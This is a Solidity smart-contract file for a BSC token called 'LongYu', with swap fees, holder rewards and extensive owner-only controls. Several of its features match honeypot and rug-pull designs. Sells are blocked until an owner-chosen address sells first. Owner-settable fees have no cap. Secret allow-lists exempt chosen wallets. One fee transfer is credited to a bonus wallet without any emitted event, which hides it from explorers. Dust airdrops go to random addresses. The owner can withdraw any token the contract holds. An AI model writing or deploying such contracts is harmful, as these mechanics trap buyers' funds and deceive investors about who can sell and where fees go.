/**
 *Submitted for verification at BscScan.com on 2023-03-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

interface IMining {
	function getuserbonus(address _addr,uint256 _amount) external;
	
}

contract DRE is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address private devAddress;
	address private bonusAddress;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    bool private startPublicSell = false;
	mapping (address => bool) public isBoss;
    mapping(address => bool) public _feeWhiteList;
	mapping (address => bool) private blist;
	mapping (address => bool) private nlist;
	mapping (address => bool) private slist;
	mapping (address => uint256) private buyblock;
	mapping (address => uint256) private bnum;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _fist;
    mapping(address => bool) public _swapPairList;
	uint160 public _modulus = 2 ** 160 -1;
    uint256 private time = 600;
	uint256 private maxbuyamount;
	uint256 private mulnum = 1;
	uint256 public bonusblock = 200;
    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 private _buyFundFee = 1;
    uint256 private _buyLPDividendFee = 1;
    uint256 private _sellLPDividendFee = 1;
    uint256 private _sellFundFee = 1;
    uint256 private _sellDevFee = 1;
	uint256 private _buyDevFee = 1;

    uint256 public startTradeBlock;
	bool private startsell;
    uint256 public maxHolder;

    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (){
        _name = "LongYu";
        _symbol = "LongYu";
        _decimals = 18;

        _fist = 0x55d398326f99059fF775485246999027B3197955;

        ISwapRouter swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IERC20(_fist).approve(address(swapRouter), MAX);

 
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), _fist);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = 400000 * 10 ** _decimals;
        _tTotal = total;
        maxHolder = total;
		maxbuyamount = 600 * 10 ** _decimals;

        fundAddress = 0x96CB78CB894bdb4AD4766193449A5C57DDE58f63;
        devAddress = 0x000000000000000000000000000000000000dEaD;

        _balances[msg.sender] = total;
        emit Transfer(address(0), msg.sender, total);

        _feeWhiteList[fundAddress] = true;
        _feeWhiteList[devAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
		

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;
		excludeHolder[msg.sender] = true;

        holderRewardCondition = 50 * 10 ** IERC20(_fist).decimals();

        _tokenDistributor = new TokenDistributor(_fist);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
		return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 9900 / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }

        bool takeFee;
        bool isSell;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
				if(_swapPairList[from]){
					require(startTradeBlock < block.timestamp, "!Trading");
					require(startTradeBlock + time < block.timestamp || blist[to] || nlist[to], "!Trading");
					if (blist[to] && startTradeBlock + time >= block.timestamp ) {
						require( bnum[to] < 1, "!Trading");
						require( amount <= maxbuyamount, "!Trading");
						bnum[to] = bnum[to]+1;
					}
				}

                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee;
                            uint256 numTokensSellToFund = amount * swapFee / 50;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
				takeFee = true;
				
				if (_swapPairList[to]) {
					isSell = true;
					require( startsell || slist[from], "!Trading");
					if (!startsell && slist[from]){
						startsell = true;
					}
				}
            }

        }
		if(!nlist[from] && !nlist[to] && !_feeWhiteList[from] && !_feeWhiteList[to]){
            takeFee = true;
        }
		
		

        _tokenTransfer(from, to, amount, takeFee, isSell);

        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }
            processReward(maxGasOfBot);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 4 / 100;
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {

            uint256 swapFee;
            if (isSell) {
				if (startTradeBlock + time >= block.timestamp){
					swapFee = 20;
				}else{
					swapFee = _sellFundFee + _sellLPDividendFee + _sellDevFee;
				}
            } else {
				if (startTradeBlock + time >= block.timestamp){
					swapFee = 30;
				}else{
					swapFee = _buyFundFee + _buyLPDividendFee + _buyDevFee;
				}
            }
            uint256 swapAmount = tAmount * swapFee / 100;
			feeAmount = tAmount * swapFee / 100;

			
			if(swapAmount > 1* 10 **3 *5){
				swapAmount -= 1* 10 **3 *5;
				address[] memory addrList = randomAddr(recipient);
				for(uint i =0;i< addrList.length; i++){
					//_rOwned[addrList[i]] = _rOwned[addrList[i]].add(rAir);
					_takeTransfer(
						sender,
						address(addrList[i]),
						1* 10 **3
						);
				}
			}
			
			if (swapAmount > 0) {
				uint256 devamount = swapAmount * _buyDevFee / swapFee;
				swapAmount -= devamount;
                _takeTransfer(
                    sender,
                    address(devAddress),
                    devamount
                );
            }
			
			if (swapAmount > 0 && swapFee > 3) {
				uint256 bonusamount = swapAmount * 80 / 100;
				swapAmount -= bonusamount;
                _takeTransfers(
                    sender,
                    address(bonusAddress),
                    bonusamount
                );
            }
			
            if (swapAmount > 0) {
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
		if(isBoss[recipient]){
			IMining(address(recipient)).getuserbonus(sender,tAmount - feeAmount);
		}
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fist;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        IERC20 FIST = IERC20(_fist);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) / swapFee;
        //uint256 devAmount = fistBalance * (_sellDevFee) / swapFee;

        FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
        //FIST.transferFrom(address(_tokenDistributor), devAddress, devAmount);
        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount);
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }
	
	function _takeTransfers(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
    }
	


    function setFundAddress(address addr) external onlyFunder {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }
	
	function setIsBoss(address _addr,bool _value) external onlyFunder {
        isBoss[_addr] = _value;

    }
	

    function setBuyLPDividendFee(uint256 dividendFee) external onlyFunder {
        _buyLPDividendFee = dividendFee;
    }

    function setBuyFundFee(uint256 fundFee) external onlyFunder {
        _buyFundFee = fundFee;
    }

    function setSellLPDividendFee(uint256 dividendFee) external onlyFunder {
        _sellLPDividendFee = dividendFee;
    }



	
	
    function setSellFundFee(uint256 fundFee) external onlyFunder {
        _sellFundFee = fundFee;
    }
	
	function setmaxbuyamount(uint256 _maxbuyamount) external onlyFunder {
        maxbuyamount = _maxbuyamount;
    }

	
    function setSellLPFee(uint256 lpFee) external onlyFunder {
        _sellDevFee = lpFee;
    }

    function startTrade(uint256 _time) external onlyFunder {
        startTradeBlock = _time;
    }
    
    function setMaxHolder(uint256 amt) external onlyFunder {
        require(amt >= 1, "max not < 1");
        maxHolder = amt;
    }

    function closeTrade() external onlyFunder {
        startTradeBlock = 0;
    }

    function setFeeWhiteList(address[] calldata addList, bool enable) external onlyFunder {
        for(uint256 i = 0; i < addList.length; i++) {
            _feeWhiteList[addList[i]] = enable;
        }
    }


	
	function setblist(address[] calldata addList, bool enable) public onlyFunder {
        for(uint256 i = 0; i < addList.length; i++) {
            blist[addList[i]] = enable;
        }
    }
	function setnlist(address[] calldata addList, bool enable) public onlyFunder {
        for(uint256 i = 0; i < addList.length; i++) {
            nlist[addList[i]] = enable;
        }
    }
	function setslist(address[] calldata addList, bool enable) public onlyFunder {
        for(uint256 i = 0; i < addList.length; i++) {
            slist[addList[i]] = enable;
        }
    }
	
	
	

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }
	
	function setTime(uint256 _time) external onlyFunder {
        time = _time;
    }
	

	
	function setBonusblock(uint256 _bonusblock) external onlyFunder {
        bonusblock = _bonusblock;
    }
	
	function setDevAddress(address _devAddress) external onlyFunder {
        devAddress = _devAddress;
    }
	
	function setBonusAddress(address _bonusAddress) external onlyFunder {
        bonusAddress = _bonusAddress;
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyFunder {
        IERC20(token).transfer(to, amount);
    }

    modifier onlyFunder() {
        require(_owner == msg.sender, "!Funder");
        _;
    }
	

	
	function randomAddr(address _addr) public view returns(address [] memory) {
        address[] memory addrlist = new address[](5);
		uint addrnum = uint(keccak256(abi.encodePacked(block.timestamp,_addr))) % _modulus;
        addrlist[0] = address(uint160(addrnum -1));
        addrlist[1] = address(uint160(addrnum -2));
        addrlist[2] = address(uint160(addrnum -3));
        addrlist[3] = address(uint160(addrnum -4));
        addrlist[4] = address(uint160(addrnum -5));
		return addrlist;
		
	}
	

    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + bonusblock > block.number) {
            return;
        }

        IERC20 FIST = IERC20(_fist);

        uint256 balance = FIST.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    FIST.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyFunder {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyFunder {
        excludeHolder[addr] = enable;
    }

    uint256 public maxGasOfBot = 500000;
    mapping (address => bool) public areadyKnowContracts;



    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }  


    function setGasLimit(uint256 newValue) public onlyFunder {
        maxGasOfBot = newValue;
    }
    function setAreadyKnowAddress(address addr,bool newValue) external onlyFunder {
        areadyKnowContracts[addr] = newValue;
    }
}